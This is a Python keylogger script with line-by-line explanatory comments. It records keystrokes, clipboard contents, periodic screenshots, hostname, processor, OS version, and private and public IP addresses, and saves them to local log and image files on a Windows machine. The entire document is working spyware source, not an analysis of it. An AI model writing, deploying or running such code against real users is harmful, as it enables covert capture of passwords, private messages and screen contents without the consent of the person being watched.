# Import necessary modules for various functionalities

# socket is used for network-related tasks, like getting IP addresses
import socket

# platform is used to retrieve platform-related information like system type, version, and machine type
import platform
# from sys import platform   # This line is commented out, but it's another option for platform info

# win32clipboard is for accessing and interacting with the system clipboard
import win32clipboard

# time is used for handling time-related tasks (e.g., waiting, timestamps)
import time
import os

# pynput is used to capture keystrokes by listening to keyboard events
from pynput.keyboard import Key, Listener

# getpass is used to get the current user’s username in a secure way
import getpass

# requests is used for making HTTP requests (to get public IP in this case)
from requests import get

# multiprocessing is for running multiple processes (e.g., screenshot capture in parallel)
from multiprocessing import Process, freeze_support

# PIL (Python Imaging Library) is used to capture screenshots
from PIL import ImageGrab

# Define log file names where the data will be stored
clipboardinfo = "clipboard.txt"
keystrokelog = "logging.txt"
sysinfo = "sysinfo.txt"

# Initialize counters for iterations
iterations = 0
iterations_end = 2  # Number of iterations before stopping the script
currentTime = time.time()  # Store the current time at the start
time_of_each_iteration = 6  # Time in seconds between each iteration
stopTime = time.time() + time_of_each_iteration  # Calculate the end time for this iteration


# Function to retrieve and log system information (hostname, IP address, etc.)
def computerinfo():
    with open(sysinfo, 'a') as f1:
        # Get the local machine's hostname and private IP address
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)

        try:
            # Try to get the public IP address using an external API
            public_IP = get("https://api.ipify.org").text
            f1.write("Public IP Address: " + public_IP)

        except Exception:
            # In case of failure to get the public IP, log an error message
            f1.write("Couldn't get Public IP Address")

        # Log additional system information
        f1.write("\n SYSTEM INFORMATION \n")
        f1.write("Processor: " + platform.processor() + '\n')  # Processor type
        f1.write("System: " + platform.system() + " " + platform.version() + '\n')  # System type and version
        f1.write("Machine: " + platform.machine() + '\n')  # Machine type (e.g., x86_64)
        f1.write("Hostname: " + hostname + '\n')  # Hostname of the machine
        f1.write("Private IP Address: " + IPAddress + '\n')  # Private IP address of the machine


# Call the computerinfo function to log system details
computerinfo()


# Function to get clipboard content and log it to a file
def clipboardcontent():
    with open(clipboardinfo, 'a') as f2:
        try:
            # Attempt to open the clipboard and retrieve its data
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()  # Get the clipboard content
            win32clipboard.CloseClipboard()

            # Write the clipboard data to the log file
            f2.write("\nClipboard data: \n" + data)

        except:
            # If clipboard access fails, log an error message
            f2.write("Clipboard cannot be copied")


# Call the clipboardcontent function to log the clipboard data
clipboardcontent()

# Loop for capturing keystrokes and other data until the conditions are met
while iterations < iterations_end or when_released(Key):

    keys = []  # List to store the keys pressed
    count = 0  # Count of keys pressed in each iteration


    # Function to handle key press events
    def when_pressed(key):
        global keys, count, currentTime

        # Print the key pressed (for debugging purposes)
        print(key)

        # Add the key to the keys list
        keys.append(key)

        # Increment the count of keys pressed
        count += 1

        # Update the timestamp for this action
        currentTime = time.time()

        # If 10 keys are pressed, process them and reset the count
        if count >= 10:
            count = 0  # Reset the key press count
            writing(keys)  # Call the function to write the pressed keys to a file
            keys = []  # Reset the list of keys


    # Function to handle writing the captured keys to a file
    def writing(key):
        with open(keystrokelog, 'a') as f:
            # Write the iteration timestamp and key actions
            f.write(f"\n\n--- Iteration {iterations + 1} started at: {time.ctime(currentTime)} ---\n")

            for key in keys:
                # Handle different key types and write appropriate representations to the file
                if key == Key.space:
                    f.write(' ')  # Spacebar pressed
                elif key == Key.enter:
                    f.write('\n')  # Enter key pressed
                elif key == Key.backspace:
                    f.write(' [BACKSPACE]')  # Backspace key pressed
                elif key == Key.shift:
                    f.write(' [SHIFT]')  # Shift key pressed
                elif key == Key.ctrl:
                    f.write(' [CTRL]')  # Control key pressed
                elif key == Key.alt:
                    f.write(' [ALT]')  # Alt key pressed
                elif key == Key.cmd:
                    f.write(' [COMMAND]')  # Command key pressed (Windows/Linux/Mac)
                elif key == Key.tab:
                    f.write(' [TAB]')  # Tab key pressed
                else:
                    # Write the key as a string without single quotes
                    f.write(str(key).replace("'", ""))


    # Function to stop the keystroke listener when conditions are met (Esc key or timeout)
    def when_released(key):
        if key == Key.esc:  # Stop if Escape key is pressed
            return False
        if currentTime > stopTime:  # Stop if the time for this iteration has passed
            return False


    # Start the listener for key press and release events
    with Listener(on_press=when_pressed, on_release=when_released) as l:
        l.join()  # Wait for the listener to finish


    # Function to take a screenshot and save it as a PNG file
    def screenshot():
        global iterations
        # Capture the entire screen and save it with a filename that includes the iteration number
        image = ImageGrab.grab()
        image.save("screenshot{}.png".format(iterations))


    # If the iteration time has passed, take a screenshot and update data
    if currentTime > stopTime:
        screenshot()  # Take a screenshot
        clipboardcontent()  # Capture clipboard content

        iterations += 1  # Increment the iteration counter

        # Update the current time and reset the stop time for the next iteration
        currentTime = time.time()
        stopTime = time.time() + time_of_each_iteration  # Set new stop time for the next iteration
